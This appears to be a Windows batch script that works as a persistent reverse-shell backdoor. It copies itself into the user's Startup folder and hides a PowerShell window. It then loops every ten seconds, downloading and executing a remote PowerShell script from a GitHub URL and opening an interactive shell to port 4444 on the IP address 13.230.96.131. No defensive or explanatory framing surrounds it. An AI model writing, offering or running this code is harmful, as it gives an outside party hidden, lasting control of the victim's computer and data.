@echo off
xcopy /s /Y "%0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -window hidden -command ""
:start
powershell IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.230.96.131 -RemotePort 4444 -Rows 24 -Cols 80
TIMEOUT /T 10
goto start